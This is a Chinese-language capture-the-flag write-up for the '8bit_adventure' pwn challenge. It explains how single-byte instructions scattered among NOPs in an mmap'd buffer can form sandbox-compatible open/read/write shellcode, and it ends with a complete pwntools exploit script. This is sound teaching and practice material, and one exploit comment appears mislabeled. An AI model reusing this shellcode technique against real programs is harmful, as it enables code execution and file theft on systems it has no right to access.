  v0 = time(0);
  srand(v0);
  puts("Welcome to the 8 bit world");
  puts("Give me your code");
  for ( i = (unsigned int)v4; (unsigned int)v4 + 0x20000 > i; i += 32 )
  {
    v2 = getchar();
    if ( v2 == -51 )
    {
      v1 = rand();
      *(_BYTE *)(v1 % 31 + i) = -51;
      *(_BYTE *)(v1 % 31 + 1 + i) = -128;
    }
    else
    {
      if ( !v2 || v2 == 10 )
        break;
      *(_BYTE *)(i + rand() % 32) = v2;
    }
  }
  close(0);
  v4();
  exit(0);
}

mmap申请一片内存。开启了沙盒

ok程序了解了，（当时没看出来，卡了一会，总是把数字看成字符的ascii,犯病了

流程

首先，mmap申请一片空间，然后用0x90填充，在往这篇内存里面读数据，（32bit，读一个）最后运行这篇空间的函数。具体看汇编

.text:080488F1                 mov     eax, [ebp+var_14]
.text:080488F4                 mov     eax, eax
.text:080488F6                 call    eax

eax就是v4。一开始我是懵逼的，因为这些我写进去的汇编都是不相邻的，怎么执行啊。

后来了解到0x90是nop指令的opcode，所以说，申请之后，其实都是被nop指令填充的，这样的话，分割的汇编代码实际上运行起来也是连续的，知道这个就好了。然后就是写汇编代码进去执行，拿flag

这里就要先了解opode

然后还有，一些有关进程的东西，可以参考我的另一篇文章。其中关于pipe管道的论述。（这是解决非预期的方法，当然也可以不了解）

该题通过close(0)解决了shellcode读入新的shellcode的方法，所以我们只能orw。

exp

分析完了，就是写exp了。

ps:题目的环境是libc2.27

  • open函数。
sys_open(const char __user *filename, int flags, int mode)
EAX = 5
filename->EBX
flags->ECX
mode->EDX

第一个参数是filename，然后是标志位，最后是mode

  • 构造 READ

实际上难点就在构造 OPEN 上，构造 READ 的时候需要注意，由于之前代码中的 close (0)，所以上面 open 打开的 fd 实际上是 0，我们需要使用 0 来当做 fd，实际上我们也可以直接利用 shellcode 来 push eax;pop ebx。

READ 参数对应的寄存器信息

sys_read(unsigned int fd, char __user * buf, size_t count)
EAX = 3
fd->EBX
buf->ECX
count->EDX

构造 WRITE

这一部分是最省力的，因为只需要修改 fd 的值即可，其他信息和 READ 中的一致

  • write 参数对应的寄存器信息
sys_write(unsigned int fd, const char __user *buf, size_t count)
EAX = 4
fd->EBX
buf->ECX
count->EDX

这里有个指令必须用到，当作是新学的。stos，这条指令实现了值到地址的转化，应为我们要在open里面实现一个flag\x00这样的字符串来作为文件表示符号，那么就需要往ebx里面去写入一个flag\x00实现的方法如下。

payload = push_eax + pop_edi + push_ebx
payload += pop_eax + inc_edi * 4 + stos_edi + dec_edi * 5 # \x00
payload += add_al_90 + dec_eax * (0x90 - 0x66) + stos_edi # f
payload += inc_eax * (0x6C - 0x66) + stos_edi # l
payload += dec_eax * (0x6C - 0x61) + stos_edi # a
payload += inc_eax * (0x67 - 0x61) + stos_edi # g

add_al_90是加0x90，但是实际上初始化还是在push_eax，我们先把eax入栈，然后去调试

发现ebx恒为0，所以这里push_eax,pop_edi之后push_ebx,pop_eax之后就把eax初始化了。

注意写入的地址是edi-edi+4接下来的两个函数很好写，就不说了，直接上exp

from pwn import *
context.log_level = "debug"
p = process('./8bit_adventure')
inc_eax = '\x40'    #inc eax
inc_ebx = '\x43'    #inc ebx
inc_edx = '\x42'    #inc edx
inc_edi = '\x47'    #inc edi
inc_ecx = '\x41'    #inc ecx
dec_eax = '\x48'    #dec eax
dec_ebx = '\x4B'    #dec ebx
dec_edi = '\x4F'    #dec edi
pop_eax = '\x58'    #pop eax
pop_ecx = '\x59'    #pop ecx
pop_edx = '\x5A'    #pop edx
pop_ebx = '\x5B'    #pop ebx
pop_edi = '\x5F'    #pop edi
int80 = '\xCD'      #int 0x80
push_edi = '\x57'   #push edi
push_ebx = '\x53'   #push ebx
push_eax = '\x50'   #push eax
push_edx = '\x52'   #push edx
stos_edi = '\xAA'   #stos edi()
add_al_90 = '\x04' #\x04\x90
payload = push_eax + pop_edi + push_ebx
payload += pop_eax + inc_edi * 4 + stos_edi + dec_edi * 5 # \x00
payload += add_al_90 + dec_eax * (0x90 - 0x66) + stos_edi # f
payload += inc_eax * (0x6C - 0x66) + stos_edi # l
payload += dec_eax * (0x6C - 0x61) + stos_edi # a
payload += inc_eax * (0x67 - 0x61) + stos_edi # g
payload += push_edi + pop_ebx + dec_ebx * 4 + dec_eax * (0x67 - 0x5) + push_edx + pop_ecx + int80 #open
payload += push_ebx + pop_ecx + push_eax + pop_ebx + inc_eax * 3 + inc_edx * 0x40 + int80 #open
payload += push_ebx + pop_eax + inc_eax * 4 + inc_ebx * 1 + int80 #write
p.sendlineafter("code", payload)
p.interactive()
